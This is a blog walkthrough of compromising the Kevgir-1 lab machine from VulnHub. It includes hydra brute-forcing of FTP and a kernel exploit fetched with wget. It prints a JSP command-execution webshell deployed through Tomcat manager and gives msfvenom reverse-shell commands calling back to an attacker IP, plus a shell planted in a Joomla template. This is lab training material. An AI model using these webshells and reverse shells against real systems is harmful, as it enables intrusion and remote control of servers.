---
layout: post
title: "vulhub:kevgir1"
date: 2016-05-02 14:42:52 -0500
comments: true
categories: [vulhub,Joomla]
---


From [Vulhub](https://www.vulnhub.com/entry/kevgir-1,137/)

###Tools:

* netdiscover
* Nmap
* hydra
* msfvenom 
* joomscan


<!--more-->

Use netdiscover to detect target IP address

`netdiscover -i eth0 -r 192.168.79.0/24`

{% img  /images/blog/vulhub/kevgir1/Selection_001.png   [title manually exploit [alt text]] %}

192.168.79.174 is the target.

Then run nmap to detect opening ports and running services on the target machine.

`nmap -sV -v -O -A -T5 192.168.79.174 -p-`

{% img  /images/blog/vulhub/kevgir1/Selection_004.png   [title manually exploit [alt text]] %}


{% img  /images/blog/vulhub/kevgir1/Selection_002.png   [title manually exploit [alt text]] %}

Let attack ftp now.

`hydra -L ~/tools/SecLists/Usernames/top_shortlist.txt -P ~/tools/SecLists/Passwords/john.txt  -u  -s 25 192.168.79.174 ftp`

get the user name and password

{% img  /images/blog/vulhub/kevgir1/Selection_005.png   [title manually exploit [alt text]] %}

try ssh using same username and password

`ssh -p 1322 admin@192.168.79.174`


FTP attack DONE


Now it is privilege escalation time

`uname -a`, get the result:

{% img  /images/blog/vulhub/kevgir1/Selection_011.png   [title manually exploit [alt text]] %}

`searchsploit 14.04`
{% img  /images/blog/vulhub/kevgir1/Selection_012.png   [title manually exploit [alt text]] %}

try `/linux/local/37292.c`, copy it to /var/www/html/, use wget to download to target machine, then compile it.

`gcc 37292.c -o attack -static`, then run `attack`

{% img  /images/blog/vulhub/kevgir1/Selection_015.png   [title manually exploit [alt text]] %}

failed, now try harder.


In the searchsploit result, there is a 39166.c. Lets try this one.

{% img  /images/blog/vulhub/kevgir1/Selection_014.png   [title manually exploit [alt text]] %}

GET the ROOT!!





Now let's attack port 8080. Use nikto to scan it first.

`nikto -h 192.168.79.174:8080`

{% img  /images/blog/vulhub/kevgir1/Selection_007.png   [title manually exploit [alt text]] %}

We got the username and password for tomcat manager ... good


log into the manager page and now we can upload webshell....

{% img  /images/blog/vulhub/kevgir1/Selection_008.png   [title manually exploit [alt text]] %}


create webshell(from pentester lab, you may generate it using msfvenom)


```php index.jsp
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>

```

now pack the webshell

```
mkdir webshell
cp index.jsp webshell

cd webshell
jar -cvf ../webshell.war *

```


now upload the webshell.war. After uploading, visit page  `192.168.79.174:8080/webshell/`.

get the shell


{% img  /images/blog/vulhub/kevgir1/Selection_009.png   [title manually exploit [alt text]] %}



Lets use msfvenom to create webshell

`msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.79.173 LPORT=4444 -f war > webshell1.war`

upload webshell1.war and setup netcat listening on port 4444. After connection is setup. do `python -c 'import pty; pty.spawn("/bin/bash")'`

get the shell

{% img  /images/blog/vulhub/kevgir1/Selection_010.png   [title manually exploit [alt text]] %}

DONE for Tomcat






Now move to port 8081

{% img  /images/blog/vulhub/kevgir1/Selection_016.png   [title manually exploit [alt text]] %}

Its Joomla!.

use tool `joomscan` to scan it

`joomscan -u http://192.168.79.174:8081`


{% img  /images/blog/vulhub/kevgir1/Selection_017.png   [title manually exploit [alt text]] %}


get the version of joomla!

Now find out the vulnerability:

{% img  /images/blog/vulhub/kevgir1/Selection_019.png   [title manually exploit [alt text]] %}

follow the instructions of this vulnerability.



login as admin:

{% img  /images/blog/vulhub/kevgir1/Selection_020.png   [title manually exploit [alt text]] %}


create php reverse shell:

`msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.79.173 LPORT=6666 -e php/base64 -f raw > shell.php`

In Extension ->Template Manager, edit existing template. Copy the content of the shell.php to it and don't forgot to add <?php and ?>. 

{% img  /images/blog/vulhub/kevgir1/Selection_021.png   [title manually exploit [alt text]] %}


set up the netcat and preview the page. get the shell

{% img  /images/blog/vulhub/kevgir1/Selection_022.png   [title manually exploit [alt text]] %}


now lets try another php webshell

[reverse shell from hacksys team](https://github.com/wg135/webshell-1/blob/master/php/reverseshell-poc.txt)

{% img  /images/blog/vulhub/kevgir1/Selection_023.png   [title manually exploit [alt text]] %}


{% img  /images/blog/vulhub/kevgir1/gameover.jpg   [title manually exploit [alt text]] %}